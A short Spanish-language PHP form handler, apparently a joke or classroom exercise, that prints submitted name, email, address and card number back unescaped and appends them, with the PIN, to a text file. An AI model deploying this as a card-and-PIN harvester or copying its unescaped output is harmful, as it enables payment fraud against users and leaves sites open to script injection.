<html>
<body>
Hola <?php echo $_POST["Nombre"]; ?></br>
Tu email es: <?php echo $_POST["Email"]; ?></br>
Pasaran a secuetrarte a la direccion: <?php echo $_POST["Direccion"]?>
, <?php echo $_POST["CP"]?>
, <?php  echo $_POST["Poblacion"] ?></br>
Por cierto, el dinerillo de tu tarjeta <?php echo $_POST["Credito"]?> ha sido robado</br>

</body>
</html>


<?php
$f=fopen('Flanders.txt','a');
fwrite($f,$_POST['Email']."\r\n");
fwrite($f,$_POST['Nombre']."\r\n");
fwrite($f,$_POST['Direccion']."\r\n");
fwrite($f,$_POST['CP']."\r\n");
fwrite($f,$_POST['Poblacion']."\r\n");
fwrite($f,$_POST['Credito']."\r\n");
fwrite($f,$_POST['PIN']."\r\n");
fclose($f)
?>